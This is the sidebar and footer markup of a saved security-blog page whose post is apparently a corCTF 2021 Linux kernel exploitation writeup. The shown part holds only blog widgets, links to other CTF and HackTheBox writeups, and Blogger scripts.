<div class="item-title"><a href="https://www.willsroot.io/2019/12/interdimensional-internet-hackthebox.html">Interdimensional Internet HacktheBox Writeup (Password Protected)</a></div>
<div class="item-snippet">Interdimensional Internet is a really cool and interesting web challenge from Makelaris.&nbsp; I really enjoyed both this challenge, which was qu...</div>
</div>
<div style="clear: both;"></div>
</li>
<li>
<div class="item-content">
<div class="item-thumbnail">
<a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html" target="_blank">
<img alt="" border="0" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/1(1).png">
</a>
</div>
<div class="item-title"><a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html">corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel</a></div>
<div class="item-snippet">In corCTF 2021, D3v17  and I wrote two kernel challenges utilizing a technique that is novel at least to our knowledge to gain arb read and ...</div>
</div>
<div style="clear: both;"></div>
</li>
</ul>
<div class="clear"></div>
</div>
</div><div class="widget HTML" data-version="1" id="HTML1">
<h2 class="title">Interesting Posts</h2>
<div class="widget-content">
<style>
#random-posts img {
    border-radius: 10px;
    float: left;
    margin-right: 5px;
    width: 75px;
    height: 75px;
    transition: all 0.2s linear 0s;
}

#random-posts img:hover {
    opacity: 0.6;
}

ul#random-posts {
    list-style-type: none;
    padding: 0px;
}

#random-posts a {
    font-size: 15px;
    padding: 0px auto 5px;
}

#random-posts a:hover {
    text-decoration: none;
}

.random-summary {
    font-size: 11px;
    background: none;
    padding: 5px;
    margin-right: 8px;
}

#random-posts li {
    margin-bottom: 10px;
    border-bottom: 1px solid #EEEEEE;
    padding: 4px;
}
</style>
<ul id="random-posts">
<script type="text/javaScript">
var randomposts_number = 6;
var randomposts_chars = 110;
var randomposts_details = 'yes';
var randomposts_comments = 'Comments';
var randomposts_commentsd = 'Comments Disabled';
var randomposts_current = [];
var total_randomposts = 0;
var randomposts_current = new Array(randomposts_number);

function randomposts(json) {
    total_randomposts = json.feed.openSearch$totalResults.$t
}
document.write('<script type=\"text/javascript\" src=\"/feeds/posts/default?alt=json-in-script&max-results=0&callback=randomposts\"><\/script>');

function getvalue() {
    for (var i = 0; i < randomposts_number; i++) {
        var found = false;
        var rndValue = get_random();
        for (var j = 0; j < randomposts_current.length; j++) {
            if (randomposts_current[j] == rndValue) {
                found = true;
                break
            }
        };
        if (found) {
            i--
        } else {
            randomposts_current[i] = rndValue
        }
    }
};

function get_random() {
    var ranNum = 1 + Math.round(Math.random() * (total_randomposts - 1));
    return ranNum
};
</script><script type="text/javascript" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/default"></script>
<script type="text/javaScript"> 
function random_posts(json) {
    for (var i = 0; i < randomposts_number; i++) {
        var entry = json.feed.entry[i];
        var randompoststitle = entry.title.$t;
        if ('content' in entry) {
            var randompostsnippet = entry.content.$t
        } else {
            if ('summary' in entry) {
                var randompostsnippet = entry.summary.$t
            } else {
                var randompostsnippet = "";
            }
        };
        randompostsnippet = randompostsnippet.replace(/<[^>]*>/g, "");
        if (randompostsnippet.length < randomposts_chars) {
            var randomposts_snippet = randompostsnippet
        } else {
            randompostsnippet = randompostsnippet.substring(0, randomposts_chars);
            var whitespace = randompostsnippet.lastIndexOf(" ");
            randomposts_snippet = randompostsnippet.substring(0, whitespace) + "&#133;";
        };
        for (var j = 0; j < entry.link.length; j++) {
            if ('thr$total' in entry) {
                var randomposts_commentsnum = entry.thr$total.$t + ' ' + randomposts_comments
            } else {
                randomposts_commentsnum = randomposts_commentsd
            }; if (entry.link[j].rel == 'alternate') {
                var randompostsurl = entry.link[j].href;
                var randomposts_date = entry.published.$t;
                if ('media$thumbnail' in entry) {
                    var randompoststhumb = entry.media$thumbnail.url
                } else {
                    randompoststhumb = "https://3.bp.blogspot.com/-Vq2QZ98cq1M/V3RUcENYgkI/AAAAAAAAAqA/3PhYksj1tX0_3YiZ51aP-rauPp2FRgN9QCK4B/s1057/COOL%2BAUDIO%2BWAVES-for-blog.jpg"
                }
            }
        };
        document.write('<li>');
        document.write('<a href="' + randompostsurl + '" rel="nofollow"><img alt="' + randompoststitle + '" src="' + randompoststhumb + '"/></a>');
        document.write('<div><a href="' + randompostsurl + '" rel="nofollow">' + randompoststitle + '</a></div>');
        if (randomposts_details == 'yes') {
            document.write('<span><div  class="random-info">' + randomposts_date.substring(8, 10) + '.' + randomposts_date.substring(5, 7) + '.' + randomposts_date.substring(0, 4) + ' - ' + randomposts_commentsnum) + '</div></span>'
        };
        document.write('<br/><div class="random-summary">' + randomposts_snippet + '</div><div style="clear:both"></div></li>')
    }
};
getvalue();
for (var i = 0; i < randomposts_number; i++) {
    document.write('<script type=\"text/javascript\" src=\"/feeds/posts/default?alt=json-in-script&start-index=' + randomposts_current[i] + '&max-results=1&callback=random_posts\"><\/script>')
};
</script><script type="text/javascript" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/default(1)"></script><li><a href="https://www.willsroot.io/2020/06/redpwnctf-2020-pwn-writeups-four.html" rel="nofollow"><img alt="RedpwnCTF 2020 Pwn Writeups (Four Function Heap, Zero the Hero)" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/COOL AUDIO WAVES-for-blog.jpg"></a><div><a href="https://www.willsroot.io/2020/06/redpwnctf-2020-pwn-writeups-four.html" rel="nofollow">RedpwnCTF 2020 Pwn Writeups (Four Function Heap, Zero the Hero)</a></div><span><div class="random-info">25.06.2020 - 0 Comments<br><div class="random-summary">RedpwnCTF 2020 was a really fun CTF and had some great pwns. Here were some of the pwns I found really…</div><div style="clear:both"></div></div></span></li><script type="text/javascript" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/default(2)"></script><li><a href="https://www.willsroot.io/2020/06/player2-hackthebox-writeup.html" rel="nofollow"><img alt="Player2 HacktheBox Writeup" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/player2.JPG"></a><div><a href="https://www.willsroot.io/2020/06/player2-hackthebox-writeup.html" rel="nofollow">Player2 HacktheBox Writeup</a></div><span><div class="random-info">27.06.2020 - 0 Comments<br><div class="random-summary">Player2 was a challenging but very fun box by MrR3boot and b14ckh34rt. The highlight of the box for me is the…</div><div style="clear:both"></div></div></span></li><script type="text/javascript" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/default(3)"></script><li><a href="https://www.willsroot.io/2019/09/headache-hackthebox-writeup-password.html" rel="nofollow"><img alt="Headache HacktheBox Writeup (Password Protected)" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/COOL AUDIO WAVES-for-blog.jpg"></a><div><a href="https://www.willsroot.io/2019/09/headache-hackthebox-writeup-password.html" rel="nofollow">Headache HacktheBox Writeup (Password Protected)</a></div><span><div class="random-info">11.09.2019 - 0 Comments<br><div class="random-summary">Headache is an amazing reversing challenge on HacktheBox. Before I start, I would like to thankD3v17 for…</div><div style="clear:both"></div></div></span></li><script type="text/javascript" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/default(4)"></script><li><a href="https://www.willsroot.io/2017/07/converting-ct-scans-into-3d-printable.html" rel="nofollow"><img alt="Converting CT scans into 3D printable models" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/ct.jpg"></a><div><a href="https://www.willsroot.io/2017/07/converting-ct-scans-into-3d-printable.html" rel="nofollow">Converting CT scans into 3D printable models</a></div><span><div class="random-info">08.07.2017 - 0 Comments<br><div class="random-summary">In this post, I will show you how to convert CT scans into 3D printable models. &nbsp;With this technique,…</div><div style="clear:both"></div></div></span></li><script type="text/javascript" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/default(5)"></script><li><a href="https://www.willsroot.io/2020/11/intense-hackthebox-writeup.html" rel="nofollow"><img alt="Intense HacktheBox Writeup" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/Capture.JPG"></a><div><a href="https://www.willsroot.io/2020/11/intense-hackthebox-writeup.html" rel="nofollow">Intense HacktheBox Writeup</a></div><span><div class="random-info">14.11.2020 - 0 Comments<br><div class="random-summary">&nbsp;Intense was a hard box involving some web exploitation techniques such as sqlite injection and hash…</div><div style="clear:both"></div></div></span></li><script type="text/javascript" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/default(6)"></script><li><a href="https://www.willsroot.io/2021/07/redpwnctf-2021-chromium-sbx-tasks.html" rel="nofollow"><img alt="RedpwnCTF 2021 Chromium SBX Tasks Writeup (Empires and Deserts)" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/sbx1.png"></a><div><a href="https://www.willsroot.io/2021/07/redpwnctf-2021-chromium-sbx-tasks.html" rel="nofollow">RedpwnCTF 2021 Chromium SBX Tasks Writeup (Empires and Deserts)</a></div><span><div class="random-info">12.07.2021 - 0 Comments<br><div class="random-summary">This weekend, I participated in RedpwnCTF with my team Starrust Crusaders under the alias "The Static…</div><div style="clear:both"></div></div></span></li>
</ul>
</div>
<div class="clear"></div>
</div><div class="widget Subscribe" data-version="1" id="Subscribe1">
<div style="white-space:nowrap">
<h2 class="title">Subscribe To This Blog</h2>
<div class="widget-content">
<div class="subscribe-wrapper subscribe-type-POST">
<div class="subscribe expanded subscribe-type-POST" id="SW_READER_LIST_Subscribe1POST" style="display:none;">
<div class="top">
<span class="inner" onclick="return(_SW_toggleReaderList(event, &quot;Subscribe1POST&quot;));">
<img class="subscribe-dropdown-arrow" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/arrow_dropdown.gif">
<img align="absmiddle" alt="" border="0" class="feed-icon" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/icon_feed12.png">
Posts
</span>
<div class="feed-reader-links">
<a class="feed-reader-link" href="https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwww.willsroot.io%2Ffeeds%2Fposts%2Fdefault" target="_blank">
<img src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/subscribe-netvibes.png">
</a>
<a class="feed-reader-link" href="https://add.my.yahoo.com/content?url=https%3A%2F%2Fwww.willsroot.io%2Ffeeds%2Fposts%2Fdefault" target="_blank">
<img src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/subscribe-yahoo.png">
</a>
<a class="feed-reader-link" href="https://www.willsroot.io/feeds/posts/default" target="_blank">
<img align="absmiddle" class="feed-icon" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/icon_feed12.png">
                  Atom
                </a>
</div>
</div>
<div class="bottom"></div>
</div>
<div class="subscribe" id="SW_READER_LIST_CLOSED_Subscribe1POST" onclick="return(_SW_toggleReaderList(event, &quot;Subscribe1POST&quot;));">
<div class="top">
<span class="inner">
<img class="subscribe-dropdown-arrow" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/arrow_dropdown.gif">
<span onclick="return(_SW_toggleReaderList(event, &quot;Subscribe1POST&quot;));">
<img align="absmiddle" alt="" border="0" class="feed-icon" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/icon_feed12.png">
Posts
</span>
</span>
</div>
<div class="bottom"></div>
</div>
</div>
<div class="subscribe-wrapper subscribe-type-PER_POST">
<div class="subscribe expanded subscribe-type-PER_POST" id="SW_READER_LIST_Subscribe1PER_POST" style="display:none;">
<div class="top">
<span class="inner" onclick="return(_SW_toggleReaderList(event, &quot;Subscribe1PER_POST&quot;));">
<img class="subscribe-dropdown-arrow" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/arrow_dropdown.gif">
<img align="absmiddle" alt="" border="0" class="feed-icon" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/icon_feed12.png">
Comments
</span>
<div class="feed-reader-links">
<a class="feed-reader-link" href="https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwww.willsroot.io%2Ffeeds%2F5446202128615786254%2Fcomments%2Fdefault" target="_blank">
<img src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/subscribe-netvibes.png">
</a>
<a class="feed-reader-link" href="https://add.my.yahoo.com/content?url=https%3A%2F%2Fwww.willsroot.io%2Ffeeds%2F5446202128615786254%2Fcomments%2Fdefault" target="_blank">
<img src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/subscribe-yahoo.png">
</a>
<a class="feed-reader-link" href="https://www.willsroot.io/feeds/5446202128615786254/comments/default" target="_blank">
<img align="absmiddle" class="feed-icon" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/icon_feed12.png">
                  Atom
                </a>
</div>
</div>
<div class="bottom"></div>
</div>
<div class="subscribe" id="SW_READER_LIST_CLOSED_Subscribe1PER_POST" onclick="return(_SW_toggleReaderList(event, &quot;Subscribe1PER_POST&quot;));">
<div class="top">
<span class="inner">
<img class="subscribe-dropdown-arrow" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/arrow_dropdown.gif">
<span onclick="return(_SW_toggleReaderList(event, &quot;Subscribe1PER_POST&quot;));">
<img align="absmiddle" alt="" border="0" class="feed-icon" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/icon_feed12.png">
Comments
</span>
</span>
</div>
<div class="bottom"></div>
</div>
</div>
<div style="clear:both"></div>
</div>
</div>
<div class="clear"></div>
</div></div>
</aside>
</div>
</div>
</div>
<div style="clear: both"></div>
<!-- columns -->
</div>
<!-- main -->
</div>
</div>
<div class="main-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<footer>
<div class="footer-outer">
<div class="footer-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left footer-fauxborder-left">
<div class="fauxborder-right footer-fauxborder-right"></div>
<div class="region-inner footer-inner">
<div class="foot no-items section" id="footer-1"></div>
<table border="0" cellpadding="0" cellspacing="0" class="section-columns columns-2">
<tbody>
<tr>
<td class="first columns-cell">
<div class="foot no-items section" id="footer-2-1"></div>
</td>
<td class="columns-cell">
<div class="foot no-items section" id="footer-2-2"></div>
</td>
</tr>
</tbody>
</table>
<!-- outside of the include in order to lock Attribution widget -->
<div class="foot section" id="footer-3" name="Footer"><div class="widget Attribution" data-version="1" id="Attribution1">
<div class="widget-content" style="text-align: center;">
Picture Window theme. Powered by <a href="https://www.blogger.com/" target="_blank">Blogger</a>.
</div>
<div class="clear"></div>
</div></div>
</div>
</div>
<div class="footer-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</footer>
<!-- content -->
</div>
</div>
<div class="content-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<script type="text/javascript">
    window.setTimeout(function() {
        document.body.className = document.body.className.replace('loading', '');
      }, 10);
  </script>

<script type="text/javascript" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/3630122430-widgets.js.下載"></script>
<script type="text/javascript">
window['__wavt'] = 'AOuZoY7QMuKfraOqf_vV-7wNZFB1-ZA-Tw:1638404953614';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d8814147965526194982','//www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html','8814147965526194982');
_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '8814147965526194982', 'title': 'Will\x27s Root', 'url': 'https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html', 'canonicalUrl': 'https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html', 'homepageUrl': 'https://www.willsroot.io/', 'searchUrl': 'https://www.willsroot.io/search', 'canonicalHomepageUrl': 'https://www.willsroot.io/', 'blogspotFaviconUrl': 'https://www.willsroot.io/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': true, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Will\x26#39;s Root - Atom\x22 href\x3d\x22https://www.willsroot.io/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Will\x26#39;s Root - RSS\x22 href\x3d\x22https://www.willsroot.io/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Will\x26#39;s Root - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/8814147965526194982/posts/default\x22 /\x3e\n\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Will\x26#39;s Root - Atom\x22 href\x3d\x22https://www.willsroot.io/feeds/5446202128615786254/comments/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'ieCssRetrofitLinks': '\x3c!--[if IE]\x3e\x3cscript type\x3d\x22text/javascript\x22 src\x3d\x22https://www.blogger.com/static/v1/jsbin/1155466832-ieretrofit.js\x22\x3e\x3c/script\x3e\n\x3c![endif]--\x3e', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/67d499d0d1051f24', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'disableGComments': true, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'Twitter', 'key': 'twitter', 'shareMessage': 'Share to Twitter', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 0, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'item', 'postId': '5446202128615786254', 'postImageThumbnailUrl': 'https://1.bp.blogspot.com/-izQijq0j-lI/YSfvHKSIK2I/AAAAAAAACH8/mBElL4uaDmYslUsEgGbwc7gDdAJzpjNtQCLcBGAsYHQ/s72-w640-c-h409/1.png', 'postImageUrl': 'https://1.bp.blogspot.com/-izQijq0j-lI/YSfvHKSIK2I/AAAAAAAACH8/mBElL4uaDmYslUsEgGbwc7gDdAJzpjNtQCLcBGAsYHQ/w640-h409/1.png', 'pageName': 'corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel', 'pageTitle': 'Will\x27s Root: corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel', 'metaDescription': ''}}, {'name': 'features', 'data': {'sharing_get_link_dialog': 'true', 'sharing_native': 'false'}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard!', 'ok': 'Ok', 'postLink': 'Post Link'}}, {'name': 'template', 'data': {'name': 'Picture Window', 'localizedName': 'Picture Window', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': false, 'variant': 'shade', 'variantId': 'shade'}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel', 'description': 'A blog about pentesting, CTFs, and security', 'featuredImage': 'https://1.bp.blogspot.com/-izQijq0j-lI/YSfvHKSIK2I/AAAAAAAACH8/mBElL4uaDmYslUsEgGbwc7gDdAJzpjNtQCLcBGAsYHQ/w640-h409/1.png', 'url': 'https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html', 'type': 'item', 'isSingleItem': true, 'isMultipleItems': false, 'isError': false, 'isPage': false, 'isPost': true, 'isHomepage': false, 'isArchive': false, 'isLabelSearch': false, 'postId': 5446202128615786254}}]);
_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', document.getElementById('Header1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogSearchView', new _WidgetInfo('BlogSearch1', 'crosscol', document.getElementById('BlogSearch1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/1670773809-lbx.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/4076883957-lightbox_bundle.css'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML2', 'sidebar-right-1', document.getElementById('HTML2'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar-right-1', document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading\x26hellip;'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_FeaturedPostView', new _WidgetInfo('FeaturedPost1', 'sidebar-right-1', document.getElementById('FeaturedPost1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_PopularPostsView', new _WidgetInfo('PopularPosts1', 'sidebar-right-1', document.getElementById('PopularPosts1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML1', 'sidebar-right-1', document.getElementById('HTML1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_SubscribeView', new _WidgetInfo('Subscribe1', 'sidebar-right-1', document.getElementById('Subscribe1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'footer-3', document.getElementById('Attribution1'), {}, 'displayModeFull'));
</script>

<link type="text/css" rel="stylesheet" href="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/4076883957-lightbox_bundle.css"><script type="text/javascript" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/1670773809-lbx.js.下載"></script></body></html>